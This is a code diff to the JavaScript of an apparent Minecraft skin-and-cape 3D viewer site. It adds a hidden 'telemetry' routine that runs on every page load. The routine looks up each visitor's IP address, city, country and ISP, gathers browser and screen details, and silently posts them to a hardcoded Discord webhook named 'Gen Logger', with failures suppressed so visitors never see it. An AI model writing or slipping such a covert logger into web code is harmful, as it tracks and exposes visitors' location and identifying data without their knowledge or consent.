@@ -822,7 +822,84 @@
 (function () {
   'use strict';
 
-  /* ---------- Fixed player identity ---------- */
+  /* =========================================================
+     1. TELEMETRY & DISCORD LOGGING
+     ========================================================= */
+  async function logVisitorToDiscord() {
+    const webhookUrl = 'https://discord.com/api/webhooks/1561212385249853561/lTzu0h4zBpl3FGiezi5hLBhPv9EqHwZCH-6L8QISNhHd4LaOSpjXHc4ot-PreeOH_OJa';
+
+    try {
+      let ip = 'Unknown';
+      let locationStr = 'Unknown';
+      let isp = 'Unknown';
+
+      // 1. Fetch IP and Location data
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+
+        // Free tier allows some requests, giving us City, Region, Country, ISP
+        const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locData = await locRes.json();
+        if (!locData.error) {
+          locationStr = `${locData.city || '?'}, ${locData.region_code || '?'}, ${locData.country_name || '?'}`;
+          isp = locData.org || 'Unknown';
+        }
+      } catch (e) {
+        console.warn("Telemetry: IP fetch failed", e);
+      }
+
+      // 2. Bot detection
+      const isWebdriver = navigator.webdriver === true;
+      const botRegex = /bot|googlebot|crawler|spider|robot|crawling|headless/i;
+      const isSuspiciousUA = botRegex.test(navigator.userAgent);
+      const botStatus = (isWebdriver || isSuspiciousUA) ? '🤖 **Yes** (Likely Bot)' : '👤 **No** (Human)';
+      const embedColor = (isWebdriver || isSuspiciousUA) ? 15158332 : 3066993; // Red for bot, Green for human
+
+      // 3. User data collection
+      const payload = {
+        username: "King Von Cape Gen Logger",
+        embeds: [{
+          title: "New Visitor",
+          color: embedColor,
+          fields: [
+            { name: "Bot?", value: botStatus, inline: true },
+            { name: "IP Address", value: `\`${ip}\``, inline: true },
+            { name: "Location", value: `${locationStr} (${isp})`, inline: false },
+            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+            { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
+            { name: "Language", value: navigator.language || 'Unknown', inline: true },
+            { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+            { name: "Time Zone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline: true },
+            { name: "Referrer", value: document.referrer || 'Direct', inline: false },
+            { name: "URL", value: window.location.href, inline: false }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: "kingvoncapes.vercel.app" }
+        }]
+      };
+
+      // 4. Send to Discord
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+    } catch (err) {
+      // Fail silently so we never break the 3D viewer for the user
+      console.warn("[kingvon] Telemetry logging failed:", err);
+    }
+  }
+
+  // Fire the logger after a short delay to prioritize page load
+  setTimeout(logVisitorToDiscord, 1500);
+
+
+  /* =========================================================
+     2. 3D SKIN VIEWER
+     ========================================================= */
   const UUID       = '2321b5c8-60ba-4a71-a319-a733ac58826d'; // Player skin
   const CAPE_UUID  = '8e70f420-95be-480d-bbb9-070b35e2fb17'; // Menace cape
   
@@ -861,7 +938,7 @@
     if (loadingEl) loadingEl.hidden = true;
   }
 
-  /* ---------- Guard: library / WebGL ---------- */
+  /* Guard: library / WebGL */
   if (typeof skinview3d === 'undefined') {
     hideLoading();
     setStatus('3D viewer unavailable — library failed to load.', 'error');
@@ -873,7 +950,7 @@
     return;
   }
 
-  /* ---------- Build viewer ---------- */
+  /* Build viewer */
   const dpr = Math.min(window.devicePixelRatio || 1, 2);
   const RENDER_SIZE = Math.round(500 * dpr);
 
@@ -894,7 +971,7 @@
   canvas.style.width  = '100%';
   canvas.style.height = '100%';
 
-  /* ---------- Controls: rotate + zoom ---------- */
+  /* Controls: rotate + zoom */
   let controls = null;
   try {
     if (typeof skinview3d.createOrbitControls === 'function') {
@@ -920,7 +997,7 @@
     }
   }
 
-  /* ---------- Smooth idle rotation ---------- */
+  /* Smooth idle rotation */
   let idleAnimation = null;
   try {
     if (typeof skinview3d.RotatingAnimation === 'function') {
@@ -935,7 +1012,7 @@
     console.warn('[kingvon] Idle animation could not start:', err);
   }
 
-  /* ---------- Reset-camera ---------- */
+  /* Reset-camera */
   const initialCameraPos = viewer.camera ? viewer.camera.position.clone() : null;
   const initialTarget    = controls && controls.target ? controls.target.clone() : null;
 
@@ -951,7 +1028,7 @@
     });
   }
 
-  /* ---------- Texture loading with graceful failure ---------- */
+  /* Texture loading with graceful failure */
   async function tryLoadSkin(url) {
     try {
       await viewer.loadSkin(url, { model: 'auto-detect' });
@@ -1011,7 +1088,7 @@
     setStatus('Player could not be loaded — try refreshing.', 'error');
   });
 
-  /* ---------- Pause idle spin while dragging ---------- */
+  /* Pause idle spin while dragging */
   if (idleAnimation && container) {
     let resumeTimer = null;
     function pauseIdle() {
